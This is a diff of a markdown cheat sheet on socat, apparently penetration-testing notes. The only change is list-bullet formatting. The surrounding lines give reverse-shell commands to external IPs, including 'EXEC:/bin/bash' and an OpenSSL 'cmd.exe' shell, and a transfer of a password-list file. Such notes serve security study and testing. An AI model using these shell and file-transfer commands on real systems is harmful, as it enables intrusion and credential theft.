@@ -162,7 +162,7 @@ address-head:
 
 **Server:**
 
-* `STDOUT` - redirects the standard output into the session
+- `STDOUT` - redirects the standard output into the session
 
 ```plain
 sudo socat TCP4:<remote-server>:80 STDOUT
@@ -170,7 +170,7 @@ sudo socat TCP4:<remote-server>:80 STDOUT
 
 **Client:**
 
-* `-` - allows STDIO to be received and interacted with via keyboard interaction
+- `-` - allows STDIO to be received and interacted with via keyboard interaction
 
 ```plain
 sudo socat - TCP4:<remote-server>:80
@@ -180,7 +180,7 @@ sudo socat - TCP4:<remote-server>:80
 
 **Sender:**
 
-* `fork` - creates a child process once a connection is made, this allows for multiple connections
+- `fork` - creates a child process once a connection is made, this allows for multiple connections
 
 ```plain
 sudo socat TCP4-LISTEN:443,fork file:list_of_passwords.txt
@@ -188,8 +188,8 @@ sudo socat TCP4-LISTEN:443,fork file:list_of_passwords.txt
 
 **Receiver:**
 
-* `file` - specifies the local file name to save the file to
-* `create` - specifies a new file will be created
+- `file` - specifies the local file name to save the file to
+- `create` - specifies a new file will be created
 
 ```plain
 $ socat TCP4:10.11.0.4:443 file:list_of_passwords.txt,create
@@ -205,9 +205,9 @@ Summer2022!
 
 **Server:**
 
-* `-d -d` - option increases verbosity
-* `TCP4-LISTEN:443` - creates the IPv4 listener on port 443
-* `STDOUT` - connects to the standard output
+- `-d -d` - option increases verbosity
+- `TCP4-LISTEN:443` - creates the IPv4 listener on port 443
+- `STDOUT` - connects to the standard output
 
 ```plain
 socat -d -d TCP4-LISTEN:443 STDOUT 
@@ -215,7 +215,7 @@ socat -d -d TCP4-LISTEN:443 STDOUT
 
 **Client:**
 
-* `EXEC:/bin/bash` - states when the connection is established it will allow access to `/bin/bash`
+- `EXEC:/bin/bash` - states when the connection is established it will allow access to `/bin/bash`
 
 ```plain
 socat TCP4:10.0.0.10:443 EXEC:/bin/bash
@@ -273,6 +273,6 @@ socat -d -d OPENSSL:192.168.189.44:443,verify=0 EXEC:'cmd.exe',pipes
 
 ## URL List
 
-* [Linux.die.net - socat](https://linux.die.net/man/1/socat)
-* [Formulae.brew.sh - socat](https://formulae.brew.sh/formula/socat)
-* [Erev0s.com - Encrypted Bind and Reverse Shells with Socat (Linux/Windows)](https://erev0s.com/blog/encrypted-bind-and-reverse-shells-socat/)
+- [Linux.die.net - socat](https://linux.die.net/man/1/socat)
+- [Formulae.brew.sh - socat](https://formulae.brew.sh/formula/socat)
+- [Erev0s.com - Encrypted Bind and Reverse Shells with Socat (Linux/Windows)](https://erev0s.com/blog/encrypted-bind-and-reverse-shells-socat/)
